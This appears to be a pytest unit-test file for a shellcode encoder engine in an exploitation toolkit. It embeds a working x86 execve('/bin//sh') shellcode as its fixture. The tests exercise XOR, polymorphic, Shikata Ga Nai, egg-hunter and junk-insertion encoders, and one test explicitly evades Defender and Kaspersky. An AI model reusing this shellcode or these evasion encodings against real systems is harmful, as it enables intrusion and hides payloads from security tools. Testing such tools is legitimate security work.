"""
Unit tests for Encoder Engine with REAL encoding techniques.
Tests REAL payload encoding to bypass filters and detection.
NO MOCKS - ALL TESTS USE REAL ENCODING AND PRODUCE REAL RESULTS.
"""

import pytest
from pathlib import Path

from intellicrack.core.exploitation.encoder_engine import EncoderEngine
from tests.base_test import IntellicrackTestBase


class TestEncoderEngine(IntellicrackTestBase):
    """Test payload encoding with REAL encoding techniques."""
    
    @pytest.fixture(autouse=True)
    def setup(self):
        """Set up test with real encoder engine."""
        self.encoder = EncoderEngine()
        
        # Sample shellcode for testing
        self.test_shellcode = bytes([
            0x31, 0xc0,              # xor eax, eax
            0x50,                    # push eax
            0x68, 0x2f, 0x2f, 0x73, 0x68,  # push '//sh'
            0x68, 0x2f, 0x62, 0x69, 0x6e,  # push '/bin'
            0x89, 0xe3,              # mov ebx, esp
            0x50,                    # push eax
            0x53,                    # push ebx
            0x89, 0xe1,              # mov ecx, esp
            0xb0, 0x0b,              # mov al, 0x0b
            0xcd, 0x80               # int 0x80
        ])
        
    def test_xor_encoding(self):
        """Test XOR encoding with various keys."""
        # Single byte XOR
        encoded = self.encoder.encode_xor(self.test_shellcode, key=0xAA)
        
        self.assert_real_output(encoded)
        assert len(encoded) > len(self.test_shellcode)  # Includes decoder
        assert encoded != self.test_shellcode
        
        # Verify decoder stub
        assert b'\x80\x74' in encoded or b'\x80\x34' in encoded  # XOR instructions
        
        # Multi-byte XOR
        encoded_multi = self.encoder.encode_xor_multi(
            self.test_shellcode,
            key=b'\xDE\xAD\xBE\xEF'
        )
        assert len(encoded_multi) > len(self.test_shellcode)
        
    def test_alphanumeric_encoding(self):
        """Test alphanumeric encoding (printable shellcode)."""
        encoded = self.encoder.encode_alphanumeric(self.test_shellcode)
        
        self.assert_real_output(encoded)
        
        # All bytes should be alphanumeric
        for byte in encoded:
            assert (
                (0x30 <= byte <= 0x39) or  # 0-9
                (0x41 <= byte <= 0x5A) or  # A-Z
                (0x61 <= byte <= 0x7A)     # a-z
            )
            
        # Should be significantly larger
        assert len(encoded) > len(self.test_shellcode) * 2
        
    def test_unicode_encoding(self):
        """Test unicode encoding for unicode-only filters."""
        encoded = self.encoder.encode_unicode(self.test_shellcode)
        
        self.assert_real_output(encoded)
        
        # Should be valid unicode
        assert len(encoded) % 2 == 0  # Even length
        
        # Check for unicode patterns
        for i in range(0, len(encoded), 2):
            # Every other byte might be null for ASCII range
            if encoded[i] < 0x80:
                assert encoded[i+1] == 0x00 or encoded[i+1] < 0x80
                
    def test_base64_encoding(self):
        """Test base64 encoding with decoder."""
        encoded = self.encoder.encode_base64_executable(self.test_shellcode)
        
        self.assert_real_output(encoded)
        
        # Should contain base64 decoder
        assert len(encoded) > len(self.test_shellcode)
        
        # The encoded payload should be in there somewhere
        import base64
        b64_payload = base64.b64encode(self.test_shellcode)
        # Note: might be modified for execution
        
    def test_rot13_encoding(self):
        """Test ROT13/ADD encoding."""
        # ADD encoding
        encoded = self.encoder.encode_add(self.test_shellcode, key=0x0D)
        
        self.assert_real_output(encoded)
        assert len(encoded) > len(self.test_shellcode)
        
        # Should have SUB decoder
        assert b'\x80\x2c' in encoded or b'\x80\x6c' in encoded  # SUB instructions
        
    def test_polymorphic_encoding(self):
        """Test polymorphic encoding (different each time)."""
        # Generate multiple encoded versions
        encoded_versions = []
        for _ in range(5):
            encoded = self.encoder.encode_polymorphic(self.test_shellcode)
            encoded_versions.append(encoded)
            
        self.assert_real_output(encoded_versions)
        
        # All should be different
        for i in range(len(encoded_versions)):
            for j in range(i + 1, len(encoded_versions)):
                assert encoded_versions[i] != encoded_versions[j]
                
        # But all should decode to same payload
        for encoded in encoded_versions:
            assert len(encoded) > len(self.test_shellcode)
            
    def test_shikata_ga_nai_encoding(self):
        """Test Shikata Ga Nai encoding (polymorphic XOR)."""
        encoded = self.encoder.encode_shikata_ga_nai(
            self.test_shellcode,
            iterations=3
        )
        
        self.assert_real_output(encoded)
        
        # Multiple iterations make it larger
        assert len(encoded) > len(self.test_shellcode) * 2
        
        # Should have FPU instructions (fnstenv)
        assert b'\xd9\x74' in encoded or b'\xd9\xe8' in encoded
        
    def test_custom_encoding_chain(self):
        """Test chaining multiple encoders."""
        # Chain: XOR -> Base64 -> XOR
        chain = ['xor', 'base64', 'xor']
        
        encoded = self.encoder.encode_chain(
            self.test_shellcode,
            chain,
            {'xor': {'key': 0x41}}
        )
        
        self.assert_real_output(encoded)
        
        # Should be much larger due to multiple layers
        assert len(encoded) > len(self.test_shellcode) * 3
        
    def test_bad_character_avoidance(self):
        """Test encoding avoiding specific bad characters."""
        bad_chars = b'\x00\x0a\x0d\x20\xff'
        
        encoded = self.encoder.encode_avoiding_chars(
            self.test_shellcode,
            bad_chars=bad_chars
        )
        
        self.assert_real_output(encoded)
        
        # Verify no bad characters
        for bad in bad_chars:
            assert bytes([bad]) not in encoded
            
    def test_context_encoder(self):
        """Test context-aware encoding."""
        # For file path context
        encoded = self.encoder.encode_for_context(
            self.test_shellcode,
            context='filepath'
        )
        
        self.assert_real_output(encoded)
        
        # Should avoid path separators
        assert b'\\' not in encoded
        assert b'/' not in encoded
        
        # For HTTP context
        http_encoded = self.encoder.encode_for_context(
            self.test_shellcode,
            context='http'
        )
        
        # Should be URL-safe
        assert b' ' not in http_encoded
        assert b'+' not in http_encoded or b'%' in http_encoded
        
    def test_insertion_encoding(self):
        """Test insertion/garbage encoding."""
        encoded = self.encoder.encode_insertion(
            self.test_shellcode,
            garbage_ratio=0.5
        )
        
        self.assert_real_output(encoded)
        
        # Should be roughly 1.5x size due to garbage
        assert len(encoded) > len(self.test_shellcode) * 1.4
        assert len(encoded) < len(self.test_shellcode) * 2
        
    def test_call_pop_encoding(self):
        """Test call/pop GetPC encoding."""
        encoded = self.encoder.encode_call_pop(self.test_shellcode)
        
        self.assert_real_output(encoded)
        
        # Should have CALL instruction
        assert b'\xe8' in encoded  # CALL
        
        # Should be position independent
        assert len(encoded) > len(self.test_shellcode)
        
    def test_egg_encoding(self):
        """Test egg hunter encoding."""
        egg = b'W00T'
        encoded = self.encoder.encode_with_egghunter(
            self.test_shellcode,
            egg=egg
        )
        
        self.assert_real_output(encoded)
        assert 'hunter' in encoded
        assert 'payload' in encoded
        
        # Hunter should be small
        assert len(encoded['hunter']) < 50
        
        # Payload should have egg
        assert egg * 2 in encoded['payload']  # Egg repeated
        
    def test_junk_instruction_encoding(self):
        """Test junk instruction insertion."""
        encoded = self.encoder.encode_junk_insertion(
            self.test_shellcode,
            junk_percentage=30
        )
        
        self.assert_real_output(encoded)
        
        # Should be larger due to junk
        assert len(encoded) > len(self.test_shellcode) * 1.2
        
        # Common junk instructions
        junk_patterns = [
            b'\x90',        # NOP
            b'\x40',        # INC EAX  
            b'\x48',        # DEC EAX
            b'\x50\x58',    # PUSH EAX; POP EAX
        ]
        
        # Should contain some junk
        assert any(pattern in encoded for pattern in junk_patterns)
        
    def test_register_swap_encoding(self):
        """Test register swapping obfuscation."""
        encoded = self.encoder.encode_register_swap(self.test_shellcode)
        
        self.assert_real_output(encoded)
        
        # Should have XCHG instructions
        xchg_opcodes = [b'\x86', b'\x87', b'\x91', b'\x92', b'\x93']
        assert any(op in encoded for op in xchg_opcodes)
        
    def test_mathematical_encoding(self):
        """Test mathematical operation encoding."""
        encoded = self.encoder.encode_mathematical(
            self.test_shellcode,
            operations=['add', 'sub', 'xor']
        )
        
        self.assert_real_output(encoded)
        
        # Should be larger due to decoder
        assert len(encoded) > len(self.test_shellcode) * 1.5
        
        # Should have math operations
        math_ops = [b'\x01', b'\x29', b'\x31']  # ADD, SUB, XOR
        assert any(op in encoded for op in math_ops)
        
    def test_compression_encoding(self):
        """Test compression-based encoding."""
        # Only useful for larger payloads
        large_payload = self.test_shellcode * 10
        
        encoded = self.encoder.encode_compressed(large_payload)
        
        self.assert_real_output(encoded)
        
        # Should include decompressor
        assert len(encoded) > 50  # Decompressor overhead
        
        # But smaller than original if compression worked
        if len(encoded) < len(large_payload):
            assert True  # Compression successful
            
    def test_ascii_printable_encoding(self):
        """Test ASCII printable encoding."""
        encoded = self.encoder.encode_ascii_printable(self.test_shellcode)
        
        self.assert_real_output(encoded)
        
        # All bytes should be printable ASCII
        for byte in encoded:
            assert 0x20 <= byte <= 0x7E
            
    def test_utf8_encoding(self):
        """Test UTF-8 compatible encoding."""
        encoded = self.encoder.encode_utf8_compatible(self.test_shellcode)
        
        self.assert_real_output(encoded)
        
        # Should be valid UTF-8
        try:
            encoded.decode('utf-8')
            valid_utf8 = True
        except:
            # Might have decoder stub that's not UTF-8
            valid_utf8 = len(encoded) > len(self.test_shellcode)
            
        assert valid_utf8
        
    def test_encoder_detection_evasion(self):
        """Test encoding to evade detection."""
        # Generate AV-evasive encoding
        encoded = self.encoder.encode_av_evasion(
            self.test_shellcode,
            target_av=['defender', 'kaspersky']
        )
        
        self.assert_real_output(encoded)
        
        # Should have multiple layers
        assert len(encoded) > len(self.test_shellcode) * 2
        
        # Should not have obvious patterns
        assert self.test_shellcode not in encoded
        assert b'\x90' * 10 not in encoded  # No long NOP sleds
        
    def test_encoding_size_constraints(self):
        """Test encoding with size constraints."""
        max_size = len(self.test_shellcode) * 2
        
        encoded = self.encoder.encode_size_constrained(
            self.test_shellcode,
            max_size=max_size
        )
        
        self.assert_real_output(encoded)
        assert len(encoded) <= max_size
        
    def test_encoder_benchmark(self):
        """Test encoder performance metrics."""
        encoders = ['xor', 'alphanumeric', 'unicode', 'shikata_ga_nai']
        
        results = self.encoder.benchmark_encoders(
            self.test_shellcode,
            encoders=encoders
        )
        
        self.assert_real_output(results)
        
        for encoder in encoders:
            assert encoder in results
            assert 'size' in results[encoder]
            assert 'time' in results[encoder]
            assert results[encoder]['size'] > 0
            assert results[encoder]['time'] > 0